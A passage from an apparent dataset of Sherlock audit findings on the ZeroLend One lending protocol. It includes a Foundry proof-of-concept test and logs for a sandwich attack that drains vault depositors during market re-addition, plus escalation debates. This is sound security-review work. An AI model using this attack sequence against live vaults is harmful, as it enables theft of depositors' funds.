vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.\n\nThe only valid variant of this issue is if there was mention of the malicious attack path. Then, I would duplicate it with #234.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**Honour-d-dev**\n\n@cvetanovv \n\nThe point here is pool creation is permissionless, so anyone can create a pool (become a pool manager) and add whichever tokens they like to their pool. The possibility of adding an oracle with wrong decimals cannot be attributed to irrational behavior(or being malicious) as there is no guarantee that the pool manager is aware of the fact that price feed decimals are not normalized (see second recommendations #166 and #442 ) in zerolend.\n\nThis can happen even if pool managers behave rationally (with good intentions) and can cause severe and irreversible damage to users before it's corrected. It's better to completely prevent the possibility of such cases as the chances of this happening is pretty high given the permissionless nature of pools.\n\n**cvetanovv**\n\n@Honour-d-dev \n\nIf the pool manager did everything right, then there is no issue here. By default, he is the external admin and, by default, should do everything correctly. If not, it is a user mistake. \n\n@nevillehuang explained it in the first comment. \n\nMy decision to reject the escalation remains.\n\n**Honour-d-dev**\n\n@cvetanovv i appreciate the effort 🙏\n\nConsider this. Alice creates a pool and decides to add the AML token to her pool and she also adds the chainlink AML/USD oracle to this pool.\n\nFrom every perspective Alice has done everything right.\nThis cannot be grouped as user mistakes because user mistakes only hurt themselves, hence why they are invalid.\n\nIn this case Alice is a pool manager and this issue will affect all users of their pool not just Alice.\n\nAs I mentioned in previous comments I believe the chances of this happening is very high.\nAnd it would be unfair to pool users to call it a user mistake. \n\n**samuraii77**\n\n@cvetanovv. how would a pool manager do everything right though? If he wants to create a pool for an asset that has a different amount of decimals in Chainlink, then this will always lead to an error. His only way of avoiding this is not creating a pool with such an asset which I don't believe is a fair reason to classify this as invalid.\n\n**cvetanovv**\n\n@Honour-d-dev @samuraii77 I understand your points.\n\nThe protocol will use standard tokens, but some standard tokens may return a different price due to the lack of decimal scaling. \nThis means that the pool manager will not be able to use them, although it is mentioned in the readme that they can be used. \n\nThis means no working functionality because they will not be used because the pool manager has to act rationally, and using them will cause a bug - Medium severity. \n\nReference: https://ethereum.stackexchange.com/questions/92508/do-all-chainlink-feeds-return-prices-with-8-decimals-of-precision, https://ethereum.stackexchange.com/questions/90552/does-chainlink-decimal-change-over-time\n\nI am planning to accept the escalation and make this issue Medium severity.\n\n**WangSecurity**\n\nResult:\nMedium\nHas duplicates \n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [Honour-d-dev](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166/#issuecomment-2395201631): accepted\n\n**coffiasd**\n\n@cvetanovv those issues that dups with this issue are also valid or not ? \n\n**cvetanovv**\n\n@coffiasd, the duplicates are also valid. Labels are added at the end after the escalations are over.",
      "summary": "\nThe `GenericLogic.sol` contract in the ZeroLend protocol assumes that all price feeds have the same number of decimals, but this is not always the case. This can lead to incorrect calculations of the health factor, which affects important operations such as liquidation, borrowing, and withdrawing. The root cause is a wrong assumption that all price feeds have the same decimals, but some tokens have a different number of decimals. This can cause severe damage to users and cannot be attributed to user mistakes. The issue has been escalated and accepted as a medium severity issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166",
      "tags": [],
      "finders": [
        "stuart\\_the\\_minion",
        "000000",
        "Honour",
        "silver\\_eth",
        "Obsidian",
        "coffiasd",
        "A2-security",
        "nfmelendez",
        "iamnmt"
      ]
    },
    {
      "id": "41824",
      "title": "M-3: Malicious actors can execute sandwich attacks during market addition with existing funds",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143 \n\n## Found by \n0xNirix\n### Summary\n\nThe immediate addition of assets from a new and re-added market with existing assets in vault's position will cause a significant financial loss for existing vault users as attackers will execute a sandwich attack to profit from the asset-share ratio changes.\n\n### Root Cause\n\nThe vulnerability stems from the immediate update of total assets when adding or re-adding a market with existing assets in the vault's position. This occurs in the _setCap method called by acceptCap:\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L85-L105\n\n```solidity\n        withdrawQueue.push(pool);\n\n        if (withdrawQueue.length > MAX_QUEUE_LENGTH) revert CuratedErrorsLib.MaxQueueLengthExceeded();\n\n        marketConfig.enabled = true;\n\n        // Take into account assets of the new market without applying a fee.\n        pool.forceUpdateReserve(asset());\n        uint256 supplyAssets = pool.supplyAssets(asset(), positionId);\n        _updateLastTotalAssets(lastTotalAssets + supplyAssets);\n```\n\nThis immediate update to assets is also reflected in the totalAssets() function, which sums the balance of all markets in the withdraw queue\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVault.sol#L368\n```solidity\n  function totalAssets() public view override returns (uint256 assets) {\n    for (uint256 i; i < withdrawQueue.length; ++i) {\n      assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);\n    }\n  }\n```\n\nThe totalAssets() value is then used in share-to-asset conversions:\n```solidity\n function _accruedFeeShares() internal view returns (uint256 feeShares, uint256 newTotalAssets) {\n    newTotalAssets = totalAssets();\n```\n```solidity\n    assets = _convertToAssetsWithTotals(shares, totalSupply(), newTotalAssets, MathUpgradeable.Rounding.Up);\n```\n\nThis mechanism allows an attacker to observe the acceptCap transaction and execute a sandwich attack:\n\nDeposit assets to receive X shares for Y assets before the market addition.\nAfter the market addition increases total assets, withdraw the same X shares to receive Y + Δ assets, where Δ is determined by the new asset-to-share ratio.\n\n### Internal pre-conditions\n\n1. Admin needs to call acceptCap() to add a market\n2. The new/ re-added market needs to have a non-zero supplyAssets value in vault's position\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\n1. Attacker calls deposit() just before a market with existing position for the vault is added\n2. Admin calls acceptCap() to add the market with existing funds for the vault\n3. Assets of the vault are immediately increased by the amount of assets in the position for the added market, as the market is added to the withdraw queue and total assets take into account assets from all markets present in the withdraw queue\n4. Attacker calls withdraw() to remove their recently deposited funds\n5. Attacker receives more assets than initially deposited due to the increased asset to share ratio.\n\n### Impact\n\nThe existing vault users suffer a loss proportional to the size of the new/ re-added market's assets relative to the total vault assets before the addition. The attacker gains this difference at the expense of other users.\n\n\n**Isn't it impossible to add a market with existing funds?**\nA: No, it's actually possible and even anticipated in two scenarios:\nReintegrating a previously removed market with leftover funds, e.g. A market removed due to an issue, but not all funds were withdrawn.\nAdding a new market that received donations to the vaults position directly via the pool contract.\n\nThe contract specifically accounts for these cases by not charging fees on these pre-existing funds, as shown by the comment in the code `// Take into account assets of the new market without applying a fee.`\n\n**Why is this vulnerability critical?**\nA: It's critical because:\n\n- It directly risks funds belonging to existing users which were lost when a market had to be removed with leftover funds.\n- Even donations loss can be considered as a loss for existing users.\n\n\n### PoC\n\n_No response_\n\n### Mitigation\n\nIn case of adding a market with existing funds, consider gradual unlocking of assets over a period of time.\n\n\n\n## Discussion\n\n**nevillehuang**\n\nrequest poc\n\n**sherlock-admin4**\n\nPoC requested from @0xNirix\n\nRequests remaining: **13**\n\n**0xNirix**\n\nThanks.\nHere is the POC code and result\n\n```solidity\npragma solidity ^0.8.0;\n\nimport './helpers/BaseVaultTest.sol';\nimport {CuratedErrorsLib, CuratedEventsLib, CuratedVault, PendingUint192} from '../../../../contracts/core/vaults/CuratedVault.sol';\nimport {CuratedVaultFactory, ICuratedVaultFactory} from '../../../../contracts/core/vaults/CuratedVaultFactory.sol';\n\nuint256 constant TIMELOCK = 1 weeks;\n\ncontract CuratedVaultSandwichTest is BaseVaultTest {\n    using MathLib for uint256;\n\n    ICuratedVault internal vault;\n    ICuratedVaultFactory internal vaultFactory;\n    ICuratedVaultFactory.InitVaultParams internal defaultVaultParams;\n\n    address attacker;\n    address user;\n\n    function setUp() public {\n        _setUpBaseVault();\n        _setUpVault();\n\n        attacker = makeAddr(\"attacker\");\n        user = makeAddr(\"user\");\n\n        // Setup initial cap for all\n        _setCap(allMarkets[0], 600 ether);\n        _setCap(allMarkets[1], 600 ether);\n        _setCap(allMarkets[2], 600 ether);\n\n        // Set supply queue to use both markets\n        IPool[] memory newSupplyQueue = new IPool[](2);\n        newSupplyQueue[0] = allMarkets[0];\n        newSupplyQueue[1] = allMarkets[1];\n        vm.prank(allocator);\n        vault.setSupplyQueue(newSupplyQueue);\n\n        // Mint tokens to users\n        deal(address(loanToken), user, 1000 ether);\n        deal(address(loanToken), attacker, 1000 ether);\n\n        // Approve vault to spend user's tokens\n        vm.prank(user);\n        loanToken.approve(address(vault), 1000 ether);\n        vm.prank(attacker);\n        loanToken.approve(address(vault), 1000 ether);\n    }\n\n    function _setUpVault() internal {\n        // copied from Integration Vault Test\n        CuratedVault instance = new CuratedVault();\n        vaultFactory = ICuratedVaultFactory(new CuratedVaultFactory(address(instance)));\n\n        // setup the default vault params\n        address[] memory admins = new address[](1);\n        address[] memory curators = new address[](1);\n        address[] memory guardians = new address[](1);\n        address[] memory allocators = new address[](1);\n        admins[0] = owner;\n        curators[0] = curator;\n        guardians[0] = guardian;\n        allocators[0] = allocator;\n        defaultVaultParams = ICuratedVaultFactory.InitVaultParams({\n            revokeProxy: true,\n            proxyAdmin: owner,\n            admins: admins,\n            curators: curators,\n            guardians: guardians,\n            allocators: allocators,\n            timelock: 1 weeks,\n            asset: address(loanToken),\n            name: 'Vault',\n            symbol: 'VLT',\n            salt: keccak256('salty')\n        });\n\n        vault = vaultFactory.createVault(defaultVaultParams);\n\n        vm.startPrank(owner);\n        vault.grantCuratorRole(curator);\n        vault.grantAllocatorRole(allocator);\n        vault.setFeeRecipient(feeRecipient);\n        vault.setSkimRecipient(skimRecipient);\n        vm.stopPrank();\n\n        _setCap(idleMarket, type(uint184).max);\n\n        loanToken.approve(address(vault), type(uint256).max);\n        collateralToken.approve(address(vault), type(uint256).max);\n\n        vm.startPrank(supplier);\n        loanToken.approve(address(vault), type(uint256).max);\n        collateralToken.approve(address(vault), type(uint256).max);\n        vm.stopPrank();\n\n        vm.startPrank(onBehalf);\n        loanToken.approve(address(vault), type(uint256).max);\n        collateralToken.approve(address(vault), type(uint256).max);\n        vm.stopPrank();\n    }\n\n\n    function _setCap(IPool pool, uint256 newCap) internal {\n        // largely copied from IntegrationVaultTest.sol\n\n        uint256 cap = vault.config(pool).cap;\n        bool isEnabled = vault.config(pool).enabled;\n\n        \n        if (newCap == cap) {\n            console.log(\"New cap is the same as current cap, returning\");\n            return;\n        }\n\n        PendingUint192 memory pendingCap = vault.pendingCap(pool);\n       \n        if (pendingCap.validAt == 0 || newCap != pendingCap.value || true) {\n            vm.prank(curator);\n            vault.submitCap(pool, newCap);\n        }\n\n        vm.warp(block.timestamp + vault.timelock());\n\n        if (newCap > 0) {\n            vault.acceptCap(pool);\n            if (!isEnabled) {\n                IPool[] memory newSupplyQueue = new IPool[](vault.supplyQueueLength() + 1);\n                for (uint256 k; k < vault.supplyQueueLength(); k++) {\n                    newSupplyQueue[k] = vault.supplyQueue(k);\n                }\n                newSupplyQueue[vault.supplyQueueLength()] = pool;\n                vm.prank(allocator);\n                vault.setSupplyQueue(newSupplyQueue);\n            }\n        }\n    }\n\n    function testSandwichAttackOnMarketReaddition() public {\n       \n        // Initial deposit by a user\n        vm.prank(user);\n        vault.deposit(800 ether, user);\n\n         // Log state \n        console.log(\"Total initial assets:\", vault.totalAssets()/ 1 ether, \"ether\");\n        console.log(\"User shares:\", vault.balanceOf(user) / 1 ether, \"ether\");\n        console.log(\"User assets:\", vault.convertToAssets(vault.balanceOf(user))/ 1 ether, \"ether\");\n\n        // First market had to be removed due to issues.\n        _setCap(allMarkets[0], 0);\n        vm.startPrank(curator);\n        vault.submitMarketRemoval(allMarkets[0]);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + vault.timelock() + 1);\n\n        vm.startPrank(allocator);\n        uint256[] memory withdrawQueue = new uint256[](3);\n        // the index of first market is 1 in withdrawal queue as setup in basevaulttest\n        withdrawQueue[0] = 0;\n        withdrawQueue[1] = 2;\n        withdrawQueue[2] = 3;\n        vault.updateWithdrawQueue(withdrawQueue);\n        vm.stopPrank();\n\n        // Attacker deposits just before market is re-added\n        vm.prank(attacker);\n        uint256 attackerShares = vault.deposit(300 ether, attacker);\n\n        console.log(\"Attacker initial deposit: 300 ether\");\n        console.log(\"Attacker shares received: \", attackerShares/ 1 ether, \"ether\");\n\n        // Re-add the removed market back which had assets\n        _setCap(allMarkets[0], 600 ether);\n\n        // Attacker withdraws\n        vm.prank(attacker);\n        uint256 withdrawnAssets = vault.redeem(attackerShares, attacker, attacker);\n\n        console.log(\"Attacker assets withdrawn after market readdition: \", withdrawnAssets/ 1 ether, \"ether\");\n        console.log(\"Attacker profit: \", (withdrawnAssets - 300 ether) / 1 ether, \"ether\");\n\n        // Check the impact on the user\n        uint256 userShares= vault.balanceOf(user);\n        uint256 userAssetsAfter = vault.convertToAssets(userShares);\n\n        console.log(\"After attack, User assets: \", userAssetsAfter/ 1 ether, \"ether\");\n        console.log(\"After attack, User loss: \", (800 ether - userAssetsAfter)/ 1 ether, \"ether\");\n\n        // Log final state\n        console.log(\"Total assets after attack:\", vault.totalAssets()/ 1 ether, \"ether\");\n    }\n}\n```\n\n\nLog output\n\nLogs:\n  Total initial assets: 800 ether\n  User shares: 800 ether\n  User assets: 800 ether\n  Attacker initial deposit: 300 ether\n  Attacker shares received:  1199 ether\n  Attacker assets withdrawn after market readdition:  659 ether\n  Attacker profit:  359 ether\n  After attack, User assets:  440 ether\n  After attack, User loss:  359 ether\n  Total assets after attack: 440 ether\n\n\n\nExplanation:\n\n1. Initial State:\n   - A user deposits 800 ether into the vault.\n   - Total assets and user's shares are both 800 ether, indicating a 1:1 ratio of assets to shares.\n   - A market with supplied assets had to be removed causing socialized loss for all users.\n\n2. Attack Preparation:\n   - Just before the market with existing funds is re-added, the attacker deposits 300 ether.\n   - The attacker receives 1199 shares, which is more than their deposit due to the current asset-to-share ratio.\n\n3. Market Re-addition:\n   - The previously removed market with existing funds is re-added to the vault after resolution of issue.\n   - This immediately increases the total assets of the vault without minting new shares.\n\n4. Attacker's Withdrawal:\n   - The attacker quickly withdraws their 1199 shares.\n   - Due to the increased total assets, these shares are now worth 659 ether.\n   - The attacker profits 359 ether (659 - 300).\n\n5. Impact on the Original User:\n   - The user's 800 shares, which originally represented 800 ether, now only represent 440 ether even though no actual fund is lost as market has recovered.\n   - The user has effectively lost 359 ether, which is exactly the amount the attacker gained.\n\n\n\n**Honour-d-dev**\n\nEscalate\n\nThe report claims this issue is valid due to the following reasons \n\n>**Isn't it impossible to add a market with existing funds?**\nA: No, it's actually possible and even anticipated in two scenarios:\nReintegrating a previously removed market with leftover funds, e.g. A market removed due to an issue, but not all funds were withdrawn.\nAdding a new market that received donations to the vaults position directly via the pool contract.\n>\n>The contract specifically accounts for these cases by not charging fees on these pre-existing funds, as shown by the comment in the code // Take into account assets of the new market without applying a fee.\n>\n>**Why is this vulnerability critical?**\nA: It's critical because:\n>\n>It directly risks funds belonging to existing users which were lost when a market had to be removed with leftover funds.\nEven donations loss can be considered as a loss for existing users.\n\nI believe this report is invalid for the following reasons\n\n**on adding/removing markets with existing funds**\n\n- There is a `reallocate()` function for this exact purpose to transfer all funds from a pool before removal, because removing a pool with existing funds will lead to a loss for the depositors.\n- The removal and addition of markets are admin functionalities and we can assume that the admin will follow the right process to prevent losses to users.\n\n**on donations**\n- Market donations fall under the **user mistakes** category, as donated funds are lost any ways. Donations can happen regardless of whether a new market is being added or not and a watcher can take advantage of the  increase in totalAssets to extract some value , this does not affect existing users negatively as they also benefit from said donations.\n\n**sherlock-admin3**\n\n> Escalate\n> \n> The report claims this issue is valid due to the following reasons \n> \n> >**Isn't it impossible to add a market with existing funds?**\n> A: No, it's actually possible and even anticipated in two scenarios:\n> Reintegrating a previously removed market with leftover funds, e.g. A market removed due to an issue, but not all funds were withdrawn.\n> Adding a new market that received donations to the vaults position directly via the pool contract.\n> >\n> >The contract specifically accounts for these cases by not charging fees on these pre-existing funds, as shown by the comment in the code // Take into account assets of the new market without applying a fee.\n> >\n> >**Why is this vulnerability critical?**\n> A: It's critical because:\n> >\n> >It directly risks funds belonging to existing users which were lost when a market had to be removed with leftover funds.\n> Even donations loss can be considered as a loss for existing users.\n> \n> I believe this report is invalid for the following reasons\n> \n> **on adding/removing markets with existing funds**\n> \n> - There is a `reallocate()` function for this exact purpose to transfer all funds from a pool before removal, because removing a pool with existing funds will lead to a loss for the depositors.\n> - The removal and addition of markets are admin functionalities and we can assume that the admin will follow the right process to prevent losses to users.\n> \n> **on donations**\n> - Market donations fall under the **user mistakes** category, as donated funds are lost any ways. Donations can happen regardless of whether a new market is being added or not and a watcher can take advantage of the  increase in totalAssets to extract some value , this does not affect existing users negatively as they also benefit from said donations.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**0xNirix**\n\nAbsolutely, vault allocator will try to withdraw from pools via reallocate before removing a pool. However, it is not possible in all scenarios. There might be a number of reasons for withdrawals to not happen or to be incomplete e.g. complete withdrawal amount not available in pool or any configuration changes by pool managers e.g. freezing the reserves. Pool managers cannot be trusted by vault managers according to README.\n> There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.\n\nThe code specifically tries to handle such scenarios further indicating they are completely intentional:\n\n1. The contract includes mechanisms to remove pools with remaining assets. This is evident in the updateWithdrawQueue function:\n```solidity\n        if (pool.supplyShares(asset(), positionId) != 0) {\n          if (config[pool].removableAt == 0) revert CuratedErrorsLib.InvalidMarketRemovalNonZeroSupply(pool);\n          if (block.timestamp < config[pool].removableAt) {\n            revert CuratedErrorsLib.InvalidMarketRemovalTimelockNotElapsed(pool);\n          }\n        }\n```\nIn this code, after timelock expiry (removableAt) pool with assets will be removed.\n\n2. Furthermore, the contract anticipates potential resolution of pool issues, allowing for the reintegration of previously removed assets. If a pool's problems are resolved in the future, the vault allocator would naturally want to reclaim those assets for the benefit of their vault users. This is why the following code exists to add back the pool's assets to the vault's total assets:\n\n```solidity\n        pool.forceUpdateReserve(asset());\n        uint256 supplyAssets = pool.supplyAssets(asset(), positionId);\n        _updateLastTotalAssets(lastTotalAssets + supplyAssets);\n```\n\nHowever, this creates a vulnerability: An attacker can exploit this process to steal a majority of these funds, as demonstrated in the provided Proof of Concept (POC).\n\n**cvetanovv**\n\nI believe the main factor that validates this issue is the lack of trust between vault managers and pool managers:\n\n> There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.\n\nWhen a pool with remaining assets is removed and later reintegrated, its assets can be exploited and stolen through this vulnerability. The key point is that vault and pool actors do not trust each other, which leaves room for such vulnerabilities.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**0xjuaan**\n\nHi @cvetanovv this is an invalid issue because the protocol works exactly how it's meant to. \n\nWhen removing a pool, the curator should reallocate the assets of the pool into a different pool before removing it. If this correct order is followed, the issue does not arise.\n\nNow the watson has stated in the comments (not the original report) that there are some cases where pool managers are malicious and freeze reserves so reallocation is not possible. In that case, if the pool is malicious, its irrational for curators to add the same pool back after removing it. So again, the issue won't occur. \n\nFurthermore, if they know the freezing is going to be temporary, then they wouldn't remove the funds from the pool in the first place. If they do so, it's incorrect actions by the vault curator causing harm to vault depositors.\n\n\n**0xNirix**\n\nThe above comment trying to invalidate the issue is incorrect. In fact, the curator would want to re-add the pool, once pool becomes available again, so as to recover the funds. Moreover, freezing and unfreezing reserves isn't necessarily indicative of malicious behavior; it can be part of normal operational procedures or some requirements (e.g. regulatory) for pool owners.\n\n**Honour-d-dev**\n\n@0xNirix \nFreezing reserves does not prevent withdrawals though, you can check the [executeWithdraw](https://github.com/zerolend/zerolend-one/blob/6b681f2a16be20cb2d43e544c164f913a8db1cb8/contracts/core/pool/logic/SupplyLogic.sol#L123) and [validateWithdraw](https://github.com/zerolend/zerolend-one/blob/6b681f2a16be20cb2d43e544c164f913a8db1cb8/contracts/core/pool/logic/ValidationLogic.sol#L96) functions, freeing only prevents supply.\nSo claims relying on freezing are invalid in this case.\n\nIf a pool is so compromised that it cannot be withdrawn from, then it doesn't makes sense for it to be added again. If it's a temporary compromise then the pool can just be shifted to be bottom of the withdraw queue (there's a functionality for this), instead of removing and loosing users funds. _**normal operational procedures**_ (as claimed in the above comment) should not be reason for removing a pool without properly reallocating funds since these are obviously temporary\n\n**0xNirix**\n\n> If a pool is so compromised that it cannot be withdrawn from, then it doesn't makes sense for it to be added again\n\nMy point is that you as a curator still want to add the pool back to recover your funds when (and if) the pool becomes withdraw-able again. You can anyways restrict any new deposit from going to the pool, so you only expect to gain back the funds. Please remember curator does not control pool's manager action and cannot guess whether it is a temporary or permanent change.\n\n\n**Honour-d-dev**\n\n> My point is that you as a curator still want to add the pool back to recover your funds when (and if) the pool becomes withdraw-able again.\n\nPool funds not being withdrawable does not mean it's compromised, and does not require drastic actions (e.g. removal) that risks users funds, lack of liquidity ( due to borrowing) can make a pool temporarily un-withdrawable. In this case the pool can be moved to the bottom of the withdraw queue until it has liquidity.\n\nVault admins are expected to know this and act rationally\n\n**0xNirix**\n\nI think we are going in a bit of circles here, but please allow me to frame the argument again:\nIt does not matter if the pool is compromised or not, or vault curator would be able to ascertain whether it is a temporary or permanent situation (which they can not always due to lack of control on pool owners actions, and vault curators have a limit on pools they can keep around in the withdraw queue).\nIn any case, including the compromised pool case, if and when the vault owner sees an opportunity to get back the funds by re-adding the pool, they must do the re-addition. They would want to withdraw back their funds and can limit any further deposit. \n\nThat is precisely why the code exists in the first place in the addition flow, that explicitly adds back the account assets from the pool. There is even a comment saying no fee should be charged from these assets because you do not want to charge a fee on the entire principal that was lost (fees are only charged on interests). This further indicates an intentional and conscious re-addition of funds, where the vulnerability lies.\n\n```solidity\n       // Take into account assets of the new market without applying a fee.\n        pool.forceUpdateReserve(asset());\n        uint256 supplyAssets = pool.supplyAssets(asset(), positionId);\n        _updateLastTotalAssets(lastTotalAssets + supplyAssets);\n```\n\n\n**Honour-d-dev**\n\nMy point is that curators can be trusted to not remove pools with user funds unless there is a security risk involved for the vault itself (i.e. vault can be exploited via pool) , in which case the pool cannot be re-added due to said security risk.\n\nAny other inconvenience can be fixed by reallocating the funds before removal or rearranging the withdraw queue.\n\nThe code is safely accounting for funds as donations are always possible \n\n**0xNirix**\n\n> My point is that curators can be trusted to not remove pools with user funds unless there is a security risk involved for the vault itself (i.e. vault can be exploited via pool) , in which case the pool cannot be re-added due to said security risk.\n\nAbsolutely my point as well, the re-addition applies to the compromised pools as well. Even if there was a security risk, that may get possibly resolved in future. Pease note the pools can be upgradeable according to Zerolend docs. \n\n> Any other inconvenience can be fixed by reallocating the funds before removal or rearranging the withdraw queue.\n\nIncorrect, like I mentioned in my previous comment, vault curators have a limit on pools in the withdraw queue and they may not be able to keep waiting by parking pools in withdraw queue for pool owner to take some action.\n\n> The code is safely accounting for funds as donations are always possible\n\nThe whole vulnerability is that the code infact fails to safely add funds while re-adding,  whether they are donations or past deposits.\n\n**Honour-d-dev**\n\n>Absolutely my point as well, the re-addition applies to the compromised pools as well. Even if there was a security risk, that may get possibly resolved in future\n\nCan you please provide a valid example of such a \"compromise\" that would cause a curator to remove a pool and re-added later.\nI believe you are yet to mention anything specific, besides freezing reserves, which is invalid.\n\n>Incorrect, like I mentioned in my previous comment, vault curators have a limit on pools in the withdraw queue and they may not be able to keep waiting by parking pools in withdraw queue for pool owner to take some action.\n\nThis situation is very unlikely (even acknowledged by you, previously) that at at best only 1 or 2 pools can be experiencing it at any point in time. \"parking pools\" is obviously a stretch \n\n**0xNirix**\n\nI was merely responding to your previous comment \n\n> My point is that curators can be trusted to not remove pools with user funds unless there is a security risk involved for the vault itself (i.e. vault can be exploited via pool) , in which case the pool cannot be re-added due to said security risk.\n\nEven in these cases, you may want to add back the pool when the security risk gets resolved e.g. via upgrade.\n\n> This situation is very unlikely (even acknowledged by you, previously) that at at best only 1 or 2 pools can be experiencing it at any point in time. \"parking pools\" is obviously a stretch\n\nI don't see any of my comment saying this is unlikely. Anyways, even if  1 or 2 pools are impacted, they can still cause this issue if the vault is already running close to the withdraw queue limit which is rather small (30). \n\nAt this point of time, I think this exchange is not making progress and converging and we are repeating same set of arguments. Will wait for HoJ to step in.\n\n**cvetanovv**\n\nI agree with @0xNirix points.\n\nThe re-addition of a pool, even after encountering issues, is possible. Vault curators don’t have control over pool manager actions, so re-adding a previously removed pool when it becomes withdrawable again is also possible.\n\nWhen pools are removed and then re-added, this vulnerability emerges due to the way assets are immediately accounted for. This means that there is a real edge case for this attack to happen without the curator making a mistake.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**0xSpearmint**\n\n@cvetanovv This issue is invalid.\n\nThe issue requires that the curator removes a pool **WITHOUT** reallocating all the assets out of it. This makes 0 sense to do since the vault is forfeiting all the depositors assets in that pool. Pools with assets should never be removed temporarily, there is no valid reason to do so.\n\nEven if the pool is somehow compromised, the curator should first try to reallocate any funds out of the pool and then set the cap to 0 to prevent further deposits but still allow withdrawals from that pool.\n\nThe report describes a scenario where the vault curator makes a mistake that causes fund loss to vault depositors, which is not a valid issue.\n\n\n\n**0xNirix**\n\nAll the points in above comment have already been discussed in this thread. Please do not repeat arguments just trying to invalidate the issue.\n\n> Even if the pool is somehow compromised, the curator should first try to reallocate any funds out of the pool and then set the cap to 0 to prevent further deposits but still allow withdrawals from that pool.\n\nReally? \nAs a curator, you would definitely not want to keep a  pool which is compromised (and may have any vulnerability including in the withdrawal path) attached to your vault in any way.\nIn fact, you would remove it right away and see if the pool owner can potentially resolve it and then re-add the pool so that you can get back your funds, once it is safe.\n\n\n\n\n\n**Honour-d-dev**\n\nThe reason I believe this issue is invalid is because under current pool and vault implementation there's no valid **compromise** that would require a pool to be removed without reallocating funds and then re-added later\n\n@0xNirix has not been able to provide a valid situation where such a process is the only solution.\nThe reason for that is obviously because such a situation does not exist and the entire issue is based on a hypothetical unspecified **compromise** \n\nOf course @0xNirix can provide a plausible example if there is one.\n\n**0xNirix**\n\nThis is amusing. First you guys yourselves bring up \"compromise\" scenarios that according to you are feasible but does not apply here, trying to invalidate the issue. The ones where you think it may warrant removal of pool with assets but no re-addition or even no removal in the first place, and when I counter that even in such conditions you may have to remove and re-add, you go back and ask where is the scenario?\n\nLet me clarify for one last time what I have already mentioned clearly in my comments earlier. My stand from day one has been that it is perfectly feasible for a curator to remove pools with assets for both non-compromised or compromised scenarios. One such scenario I had mentioned was when the pool may be non-withdrawable for a long time as no repayments are done. Pool owner may further aggravate this situation by freezing assets so no more deposits can come. Curator does not know if repayments will ever come or if pool owner will ever remove freeze to allow more deposits. They may take a rational decision to write off this bad debt for the moment. This is a standard practice that is done by even physical banks. Why? Because you do not want to impact your new depositors when you know with whatever information you have that part of your assets may not be returned. Otherwise you risk lowering their final yield by socializing old losses with new depositors, eventually discouraging new vault depositors. However, in this particular case, vault has a real limitation that will force curator to remove such pools with assets from the withdraw queue even earlier. This because a vault can only keep limited (up to 30 pools) in its withdraw queue, so if a vault is running near its capacity of 30 pools and even one pool has some issues they may be forced to take such call sooner than later. Now, if the pool owner decides to allow deposits again, curator will see a chance to get their funds back and hence would want to re-add the pool. This is just one scenario but all the compromise scenarios that you thought do not apply but are feasible are actually applicable too and there is real risk of vault losing funds because of this vulnerability in many such scenarios overall.\n\nWill wait for HoJ to take a final call.\n\n\n\n\n\n**Honour-d-dev**\n\n@0xNirix it is your report that first mentions an **issue** but fails to provide a valid example as we see here\n> **Isn't it impossible to add a market with existing funds?**\nA: No, it's actually possible and even anticipated in two scenarios:\nReintegrating a previously removed market with leftover funds, e.g. A market removed due to an **_issue_**, but not all funds were withdrawn.\n\n> My stand from day one has been that it is perfectly feasible for a curator to remove pools with assets for both non-compromised or compromised scenarios\n\nNo rational curator would remove a pool for non-compromised scenarios, this is because users who withdraw before the pool is re-added would definitely suffer a loss and waiting for the pool to be re-added is not an option as they don't know when it'll be added or if it ever will be. \nPool removal with leftover funds is a **last resort solution** due to this reason and should not be taken lightly\n\n> One such scenario I had mentioned was when the pool may be non-withdrawable for a long time as no repayments are done. Pool owner may further aggravate this situation by freezing assets so no more deposits can come. Curator does not know if repayments will ever come or if pool owner will ever remove freeze to allow more deposits. They may take a rational decision to write off this bad debt for the moment. \n\nThis scenario is invalid, if a pool is non-withdrawable due to lack of funds, even if the pool owner freezes the asset repayments will still be possible because freezing does not affect repayments. In this scenario a rational curator will simply reorder the withdraw queue and wait for those repayments instead of removing the market and costing users their funds. \n\nIt is very obvious that currently this issue has no possible scenario, and also obvious that it cannot be medium severity\n\n\n**0xNirix**\n\n@Honour-d-dev, please read my entire comment. I have clearly explained why it may be necessary and rational for a curator to remove a pool rather than simply reorder it.\n\n@cvetanovv, I apologize for this late request, but upon further consideration, I believe this issue should be upgraded to **High**. The impact of this issue is very similar to issue #233, which was judged high, where a pool owner could maliciously set incorrect interest rates causing withdrawals to revert. Eventually, a curator would reasonably consider such funds lost and remove the pool. They would need to remove such failing pools from their withdrawal queues for the reasons I explained in https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143#issuecomment-2432814025: to prevent losses to the new depositors and/or due to withdrawal queue limitations. Later, the pool owner could correct the interest rate, and the curator would want to re-add the pool to the vault. However, the pool owner would then execute this attack from a different wallet. The impact would be identical - loss of vault funds that were in the pool, and the pool owner could even claim they have no malicious intent.\n\n**Honour-d-dev**\n\n> @Honour-d-dev, please read my entire comment. I have clearly explained why it may be necessary and rational for a curator to remove a pool rather than simply reorder it.\n\nI read your comment, I believe the 30 pool limit is not a valid reason either. Reordering to preserve users 